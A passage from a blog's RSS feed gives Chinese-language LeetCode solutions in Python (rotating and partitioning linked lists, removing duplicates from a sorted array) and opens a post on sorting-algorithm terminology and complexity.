comment" spellcheck="true">#         self.val = val</span><span class="token comment" spellcheck="true">#         self.next = next</span><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">rotateRight</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> head<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        :type head: ListNode        :type k: int        :rtype: ListNode        """</span>        <span class="token keyword">if</span> head <span class="token keyword">is</span> None <span class="token operator">or</span> k<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token keyword">return</span> head        n<span class="token operator">=</span><span class="token number">0</span>        cur<span class="token operator">=</span>head        pre<span class="token operator">=</span>head        <span class="token comment" spellcheck="true">###第一步：找到链表长度</span>        <span class="token keyword">while</span> cur<span class="token punctuation">:</span>            n<span class="token operator">=</span>n<span class="token operator">+</span><span class="token number">1</span>            pre<span class="token operator">=</span>cur            cur<span class="token operator">=</span>cur<span class="token punctuation">.</span>next        <span class="token comment" spellcheck="true">#第二步 K求余</span>        k<span class="token operator">=</span>k<span class="token operator">%</span>n        <span class="token comment" spellcheck="true">#第三步  首位相连 </span>        pre<span class="token punctuation">.</span>next<span class="token operator">=</span>head        <span class="token comment" spellcheck="true">#第四步 找到切割点：即倒数第K个元素的前一个</span>        cur<span class="token operator">=</span>head        <span class="token comment" spellcheck="true">##找到切割点</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>n<span class="token operator">-</span>k<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            cur<span class="token operator">=</span>cur<span class="token punctuation">.</span>next        <span class="token comment" spellcheck="true">#第五步 进行切割</span>        newhead<span class="token operator">=</span>cur<span class="token punctuation">.</span>next<span class="token comment" spellcheck="true">#新的头节点</span>        cur<span class="token punctuation">.</span>next<span class="token operator">=</span>None        <span class="token keyword">return</span> newhead<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="复杂度分析-15"><a href="#复杂度分析-15" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><ul><li>时间复杂度：O(N)</li><li>空间复杂度：O(1)</li></ul><h2 id="14-leetcode-86-分隔链表"><a href="#14-leetcode-86-分隔链表" class="headerlink" title="14 leetcode 86. 分隔链表"></a>14 <a href="https://leetcode-cn.com/problems/partition-list/">leetcode 86. 分隔链表</a></h2><p>给你一个链表的头节点 head 和一个特定值 x ，请你对链表进行分隔，使得所有 小于 x 的节点都出现在 大于或等于 x 的节点之前。</p><p>你应当保留两个分区中每个节点的初始相对位置。</p><p>示例1：</p><p><img src="/2020/05/07/leetcode-list/1626145407140.png" alt="1626145407140"></p><pre><code>输入：head = [1,4,3,2,5,2], x = 3输出：[1,2,2,4,3,5]</code></pre><p><strong>示例 2：</strong></p><pre><code>输入：head = [2,1], x = 2输出：[1,2]</code></pre><h3 id="解题思路-13"><a href="#解题思路-13" class="headerlink" title="解题思路"></a>解题思路</h3><p>只需要遍历链表的所有节点，小于x的放到一个小的链表中，大于等于x的放到一个大的链表中，最后再把这两个链表串起来即可。<img src="/2020/05/07/leetcode-list/1626166279711.png" alt="1626166279711"></p><h3 id="代码-15"><a href="#代码-15" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">partition</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> head<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        :type head: ListNode        :type x: int        :rtype: ListNode        """</span>        <span class="token comment" spellcheck="true">#小链表的头</span>        smallhead<span class="token operator">=</span>ListNode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#大链表的头</span>        bighead<span class="token operator">=</span>ListNode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#小链表的尾巴</span>        smalltail<span class="token operator">=</span>smallhead        <span class="token comment" spellcheck="true">#大链表的尾巴</span>        bigtail<span class="token operator">=</span>bighead        <span class="token keyword">while</span> head<span class="token punctuation">:</span>            <span class="token keyword">if</span> head<span class="token punctuation">.</span>val<span class="token operator">&lt;</span>x<span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># 如果当前节点的值小于x，则把当前节点挂到小链表的后面</span>                smalltail<span class="token punctuation">.</span>next<span class="token operator">=</span>head                smalltail<span class="token operator">=</span>smalltail<span class="token punctuation">.</span>next            <span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true"># 否则挂到大链表的后面</span>                bigtail<span class="token punctuation">.</span>next<span class="token operator">=</span>head                bigtail<span class="token operator">=</span>bigtail<span class="token punctuation">.</span>next            head<span class="token operator">=</span>head<span class="token punctuation">.</span>next        <span class="token comment" spellcheck="true">#最后再把大小链表拼接在一块即可。</span>        smalltail<span class="token punctuation">.</span>next<span class="token operator">=</span>bighead<span class="token punctuation">.</span>next        bigtail<span class="token punctuation">.</span>next<span class="token operator">=</span>None        <span class="token keyword">return</span> smallhead<span class="token punctuation">.</span>next<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="复杂度分析-16"><a href="#复杂度分析-16" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><p><strong>复杂度分析</strong></p><ul><li>时间复杂度: O(n)，其中 n是原链表的长度。我们对该链表进行了一次遍历。</li><li>空间复杂度: O(1)。为啥空间复杂度是O(1)？ 因为只生成了两个初始的头结点，之后的操作都是在原链表上进行的，head，small，big三个指针 </li></ul><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://leetcode-cn.com/problems/reverse-linked-list/solution/dong-hua-yan-shi-206-fan-zhuan-lian-biao-by-user74/">链表相关题目</a> 超级棒 推荐</p><p><a href="https://leetcode-cn.com/problems/reverse-linked-list-ii/solution/fan-zhuan-lian-biao-ii-by-leetcode-solut-teyq/">反转链表II解法</a>   很详细</p><p><a href="https://leetcode-cn.com/problems/linked-list-cycle-ii/solution/huan-xing-lian-biao-iikuai-man-zhi-zhen-eaqzh/">环距离公式推导</a>  情况都考虑到了</p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/leetcode/">leetcode</category>
      
      
      <comments>https://m01ly.github.io/2020/05/07/leetcode-list/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>leetcode每日一题</title>
      <link>https://m01ly.github.io/2020/04/06/leetcode-daily/</link>
      <guid>https://m01ly.github.io/2020/04/06/leetcode-daily/</guid>
      <pubDate>Mon, 06 Apr 2020 07:25:40 GMT</pubDate>
      
      <description>&lt;p&gt;每日一题的leetcode&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>每日一题的leetcode<a id="more"></a></p><h3 id="删除有序数组重复项II"><a href="#删除有序数组重复项II" class="headerlink" title="删除有序数组重复项II"></a>删除有序数组重复项II</h3><p><strong>题目描述：</strong></p><p>给你一个有序数组 nums ，请你 原地 删除重复出现的元素，使每个元素 只出现一次 ，返回删除后数组的新长度。</p><p>不要使用额外的数组空间，你必须在 原地 修改输入数组 并在使用 O(1) 额外空间的条件下完成。</p><p><strong>示例 1：</strong></p><p>输入：nums = [1,1,2]<br>输出：2, nums = [1,2]<br>解释：函数应该返回新的长度 2 ，并且原数组 nums 的前两个元素被修改为 1, 2 。不需要考虑数组中超出新长度后面的元素。</p><p><strong>解题思路：</strong></p><p>因为本体不能额外申请数组空间，因此很容易想到需要一个指针来记录满足条件的位置，一个指针用于遍历数组，因此本题采用双指针很容易做出来。</p><p>慢指针 slow : 指向当前即将放置元素的位置；则 slow - 1 是刚才已经放置了元素的位置。<br>快指针 fast : 向后遍历所有元素；<br>因为最多允许两个重复元素，并且 slow - 2 位置是上上次放置了元素的位置，所以让 nums[fast] 跟 nums[slow - 2] 进行比较。每次都是只允许最多两个元素出现重复，这两个元素的位置在 slow - 1 和 slow - 2。</p><p><strong>思路：</strong>慢指针即满足题目条件的最大索引（最后满足条件数组的长度），快指针用于遍历数组；这里可以想象慢指针指向的是一个新的数组，我们只需要关心慢指针什么时候增加满足条件的元素，即不重复两次的元素，即nums[slow-2]!=nums[fast]；若满足，则添加新元素nums[slow]=nums[fast]，指针后移slow=slow+1。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#不重复两次的元素class Solution(object):</span>    <span class="token keyword">def</span> <span class="token function">removeDuplicates</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums<span class="token punctuation">)</span><span class="token punctuation">:</span>        slow<span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">for</span> fast <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>slow<span class="token operator">&lt;</span><span class="token number">2</span> <span class="token operator">or</span> nums<span class="token punctuation">[</span>slow<span class="token number">-2</span><span class="token punctuation">]</span><span class="token operator">!=</span>nums<span class="token punctuation">[</span>fast<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#不重复两次的元素</span>                nums<span class="token punctuation">[</span>slow<span class="token punctuation">]</span><span class="token operator">=</span>nums<span class="token punctuation">[</span>fast<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#</span>                slow<span class="token operator">=</span>slow<span class="token operator">+</span><span class="token number">1</span><span class="token comment" spellcheck="true">#指针后移</span>        <span class="token keyword">return</span> slow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考：<a href="https://leetcode-cn.com/problems/remove-duplicates-from-sorted-array-ii/solution/fu-xue-ming-zhu-dong-hua-ti-jie-bang-zhu-yrx5/">https://leetcode-cn.com/problems/remove-duplicates-from-sorted-array-ii/solution/fu-xue-ming-zhu-dong-hua-ti-jie-bang-zhu-yrx5/</a></p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/leetcode/">leetcode</category>
      
      
      <comments>https://m01ly.github.io/2020/04/06/leetcode-daily/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>排序算法</title>
      <link>https://m01ly.github.io/2020/03/29/leetcode-sort/</link>
      <guid>https://m01ly.github.io/2020/03/29/leetcode-sort/</guid>
      <pubDate>Sun, 29 Mar 2020 12:19:30 GMT</pubDate>
      
      <description>&lt;p&gt;排序算法可以分为内部排序和外部排序，内部排序是数据记录在内存中进行排序，而外部排序是因排序的数据很大，一次不能容纳全部的排序记录，在排序过程中需要访问外存。常见的内部排序算法有：插入排序、希尔排序、选择排序、冒泡排序、归并排序、快速排序、堆排序、基数排序等。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>排序算法可以分为内部排序和外部排序，内部排序是数据记录在内存中进行排序，而外部排序是因排序的数据很大，一次不能容纳全部的排序记录，在排序过程中需要访问外存。常见的内部排序算法有：插入排序、希尔排序、选择排序、冒泡排序、归并排序、快速排序、堆排序、基数排序等。<a id="more"></a></p><p>用一张图概括： </p><p> <img src="/2020/03/29/leetcode-sort/1617020746261.png" alt="1617020746261"> </p><h2 id="术语铺垫"><a href="#术语铺垫" class="headerlink" title="术语铺垫"></a>术语铺垫</h2><p>有些人可能不知道什么是稳定排序、原地排序、时间复杂度、空间复杂度，我这里先简单解释一下：</p><p>1、稳定排序：如果 a 原本在 b 的前面，且 a == b，排序之后 a 仍然在 b 的前面，则为稳定排序。</p><p>2、非稳定排序：如果 a 原本在 b 的前面，且 a == b，排序之后 a 可能不在 b 的前面，则为非稳定排序。</p><p>3、原地排序：原地排序就是指在排序过程中不申请多余的存储空间，只利用原来存储待排数据的存储空间进行比较和交换的数据排序。</p><p>4、非原地排序：需要利用额外的数组来辅助排序。</p><p>5、时间复杂度：一个算法执行所消耗的时间。</p><p>6、空间复杂度：运行完一个算法所需的内存大小。</p><p>关于时间复杂度</p><p>平方阶 (O(n2)) 排序 各类简单排序：直接插入、直接选择和冒泡排序。</p><p>线性对数阶 (O(nlog2n)) 排序 快速排序、堆排序和归并排序；</p><p>O(n1+§)) 排序，§ 是介于 0 和 1 之间的常数。 希尔排序</p><p>线性阶 (O(n)) 排序 基数排序，此外还有桶、箱排序。</p><p>关于稳定性</p><p>稳定的排序算法：冒泡排序、插入排序、归并排序和基数排序。</p><p>不是稳定的排序算法：选择排序、快速排序、希尔排序、堆排序。</p><p>名词解释：</p><ul><li>n：数据规模</li><li>k：”桶”的个数</li><li>In-place：占用常数内存，不占用额外内存</li><li>Out-place：占用额外内存</li><li>稳定性：排序后 2 个相等键值的顺序和排序之前它们的顺序相同</li></ul><p>1  冒泡排序</p><p><a href="https://zhuanlan.zhihu.com/p/57088609">https://zhuanlan.zhihu.com/p/57088609</a></p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/leetcode/">leetcode</category>
      
      
      <comments>https://m01ly.github.io/2020/03/29/leetcode-sort/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
